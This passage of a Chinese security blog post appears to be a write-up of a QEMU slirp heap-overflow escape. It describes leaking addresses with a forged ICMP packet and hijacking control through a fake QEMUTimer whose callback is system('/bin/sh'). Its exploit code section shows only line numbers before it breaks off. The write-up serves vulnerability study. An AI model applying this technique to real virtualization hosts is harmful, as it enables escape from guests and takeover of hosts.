class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">icmp</span> &#123;</span></span><br><span class="line">u_charicmp_type;<span class="comment">/* type of message, see below */</span></span><br><span class="line">u_charicmp_code;<span class="comment">/* type sub code */</span></span><br><span class="line">u_shorticmp_cksum;<span class="comment">/* ones complement cksum of struct */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">u_char ih_pptr;<span class="comment">/* ICMP_PARAMPROB */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">ih_gwaddr</span>;</span><span class="comment">/* ICMP_REDIRECT */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ih_idseq</span> &#123;</span></span><br><span class="line">u_shorticd_id;</span><br><span class="line">u_shorticd_seq;</span><br><span class="line">&#125; ih_idseq;</span><br><span class="line"><span class="type">int</span> ih_void;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ICMP_UNREACH_NEEDFRAG -- Path MTU Discovery (RFC1191) */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ih_pmtu</span> &#123;</span></span><br><span class="line">u_short ipm_void;</span><br><span class="line">u_short ipm_nextmtu;</span><br><span class="line">&#125; ih_pmtu;</span><br><span class="line">&#125; icmp_hun;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span>icmp_pptricmp_hun.ih_pptr</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>icmp_gwaddricmp_hun.ih_gwaddr</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>icmp_idicmp_hun.ih_idseq.icd_id</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>icmp_seqicmp_hun.ih_idseq.icd_seq</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>icmp_voidicmp_hun.ih_void</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>icmp_pmvoidicmp_hun.ih_pmtu.ipm_void</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>icmp_nextmtuicmp_hun.ih_pmtu.ipm_nextmtu</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">id_ts</span> &#123;</span></span><br><span class="line">n_time its_otime;</span><br><span class="line">n_time its_rtime;</span><br><span class="line">n_time its_ttime;</span><br><span class="line">&#125; id_ts;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">id_ip</span>  &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ip</span> <span class="title">idi_ip</span>;</span></span><br><span class="line"><span class="comment">/* options and then 64 bits of data */</span></span><br><span class="line">&#125; id_ip;</span><br><span class="line"><span class="type">uint32_t</span>id_mask;</span><br><span class="line"><span class="type">char</span>id_data[<span class="number">1</span>];</span><br><span class="line">&#125; icmp_dun;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span>icmp_otimeicmp_dun.id_ts.its_otime</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>icmp_rtimeicmp_dun.id_ts.its_rtime</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>icmp_ttimeicmp_dun.id_ts.its_ttime</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>icmp_ipicmp_dun.id_ip.idi_ip</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>icmp_maskicmp_dun.id_mask</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>icmp_dataicmp_dun.id_data</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里泄漏地址的方法如下</p><ol><li>首先通过堆溢出覆写<code>m_data</code>指针的低三位为<code>0xb00</code>（因为<code>heap</code>所在的内存页虚拟地址为<code>0Xxx000000</code>），不会存在越界的问题</li><li>通过任意地址写将伪造的<code>icmp</code>数据包写入到<code>0x7fxxxb00+0x318+0x14+0x14</code>处（<code>eth,ip</code>报头为<code>0x14</code>字节，<code>m_len</code>为<code>0x318</code>）</li><li>再来一次任意写，先<code>connect</code>得到<code>so_rcv</code>，再发送一个<code>icmp</code>数据包，其中<code>MF=1</code>，那么<code>mbuf</code>就会被分配到<code>so_rcv</code>的后面</li><li>覆写<code>m_data</code>改为<code>0x7fxxxb00+0x318+0x14+0x14</code>即伪造的<code>icmp</code>数据包的位置</li><li>发送一个<code>MF=0</code>的数据包触发<code>icmp</code>响应，得到伪造的<code>icmp</code>数据包及后面的脏数据，从而泄漏出二进制基址和堆地址</li></ol><h3 id="劫持控制流"><a href="#劫持控制流" class="headerlink" title="劫持控制流"></a>劫持控制流</h3><p>最后劫持控制流的方法就是利用<code>QemuTimer</code>，<code>bss</code>数据段中存在一个全局变量<code>main_loop_tlg</code>，类型为<code>QEMUTimerList</code>，其成员变量<code>active_tiemrs</code>为<code>QEMUTimer*</code>类型的变量，我们在堆中伪造这两个变量，覆写<code>bss</code>中的全局变量，伪造<code>cb</code>为<code>system.plt</code>，伪造<code>opaque</code>为<code>/bin/sh</code>，那么当<code>expire_time</code>过完之后就会触发<code>timer</code>的调用，发生如下的调用链</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timer_mod-&gt;timer_mod_ns-&gt;timerlist_notify-&gt;notify_cb(notify_opaque, clock-&gt;type)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// util/qemu-timer.c</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QEMUTimerList</span> &#123;</span></span><br><span class="line">    QEMUClock *clock;</span><br><span class="line">    QemuMutex active_timers_lock;</span><br><span class="line">    QEMUTimer *active_timers;</span><br><span class="line">    QLIST_ENTRY(QEMUTimerList) <span class="built_in">list</span>;</span><br><span class="line">    QEMUTimerListNotifyCB *notify_cb;</span><br><span class="line">    <span class="type">void</span> *notify_opaque;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* lightweight method to mark the end of timerlist&#x27;s running */</span></span><br><span class="line">    QemuEvent timers_done_ev;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// include/qemu/timer.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QEMUTimer</span> &#123;</span></span><br><span class="line">    <span class="type">int64_t</span> expire_time;        <span class="comment">/* in nanoseconds */</span></span><br><span class="line">    QEMUTimerList *timer_list;</span><br><span class="line">    QEMUTimerCB *cb;  <span class="comment">// 函数指针</span></span><br><span class="line">    <span class="type">void</span> *opaque;     <span class="comment">// 参数</span></span><br><span class="line">    QEMUTimer *next;</span><br><span class="line">    <span class="type">int</span> attributes;</span><br><span class="line">    <span class="type">int</span> scale;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这个<code>notify_cb</code>就是<code>cb</code>即<code>call back</code>函数，<code>notify_opaque</code>就是<code>opaque</code>。</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p><code>raycp</code>师傅的<code>exp</code>如下，就使用的这个<code>exp</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span 